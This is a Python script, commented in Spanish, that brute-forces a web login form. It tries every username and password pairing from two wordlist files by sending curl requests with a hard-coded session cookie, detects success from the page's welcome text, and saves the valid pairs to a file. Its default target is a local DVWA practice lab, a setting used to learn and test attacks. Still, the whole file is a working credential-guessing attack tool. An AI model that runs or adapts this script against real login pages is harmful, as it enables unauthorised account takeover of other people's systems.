# python3 brute.py --users username.txt --passwords password.txt --output valid_pairs.txt

import argparse
import subprocess
from itertools import product
from pathlib import Path
from urllib.parse import quote
import re

# Cookie que enviaste
DEFAULT_COOKIE = "security=low; PHPSESSID=6e6ee3e831fd666000c17b55935d95f1"
DEFAULT_USER_AGENT = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
DEFAULT_ACCEPT = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"

def load_lines(path):
    p = Path(path)
    if not p.exists():
        raise SystemExit(f"Fichero no encontrado: {path}")
    return [l.strip() for l in p.read_text(encoding="utf-8").splitlines() if l.strip()]

def try_login(base_url, referer, cookie, user, pw, extra_headers=None, timeout=20):
    url = f"{base_url}?username={quote(user)}&password={quote(pw)}&Login=Login"
    cmd = [
        "curl",
        "-s",             
        "-L",             
        "--compressed",   
        "-H", f"User-Agent: {DEFAULT_USER_AGENT}",
        "-H", f"Accept: {DEFAULT_ACCEPT}",
        "-H", f"Referer: {referer}",
        "-b", cookie,
        url
    ]
    if extra_headers:
        for h in extra_headers:
            cmd[ -1: -1] = ["-H", h]  # insertar antes de la URL

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return False, "", -1

    body = proc.stdout or ""
    # Buscar "Welcome to the password protected area <username>" para detectar exito.
    pattern = re.compile(r"Welcome to the password protected area\s*" + re.escape(user), re.IGNORECASE)
    success = bool(pattern.search(body))
    return success, body, proc.returncode

def main():
    ap = argparse.ArgumentParser(description="Brute-force usando curl (para localhost/DVWA).")
    ap.add_argument("--users", required=True, help="fichero con usuarios (uno por línea)")
    ap.add_argument("--passwords", required=True, help="fichero con contraseñas (uno por línea)")
    ap.add_argument("--output", default="valid_pairs.txt", help="fichero donde guardar pares válidos")
    ap.add_argument("--base-url", default="http://localhost:4280/vulnerabilities/brute/", help="URL base")
    ap.add_argument("--referer", default="http://localhost:4280/vulnerabilities/brute/", help="Referer header")
    ap.add_argument("--cookie", default=DEFAULT_COOKIE, help="cookie para enviar con -b")
    ap.add_argument("--extra-header", action="append", help="encabezados HTTP extra (repetir para varios)")
    args = ap.parse_args()

    users = load_lines(args.users)
    passwords = load_lines(args.passwords)
    out_path = Path(args.output)
    out_path.parent.mkdir(parents=True, exist_ok=True)

    found_count = 0
    total = 0

    # iterar todas las combinaciones
    for user, pw in product(users, passwords):
        total += 1
        print(f"[{total}] Probando {user}:{pw} ...", end="", flush=True)
        ok, body, rc = try_login(args.base_url, args.referer, args.cookie, user, pw, extra_headers=args.extra_header)
        if ok:
            print(" OK")
            with out_path.open("a", encoding="utf-8") as f:
                f.write(f"{user}:{pw}\n")
            found_count += 1
        else:
            print(" fallo")

    print(f"\nHecho. Total intentos: {total}. Pares válidos encontrados: {found_count}. Guardado en: {out_path.resolve()}")

if __name__ == "__main__":
    main()
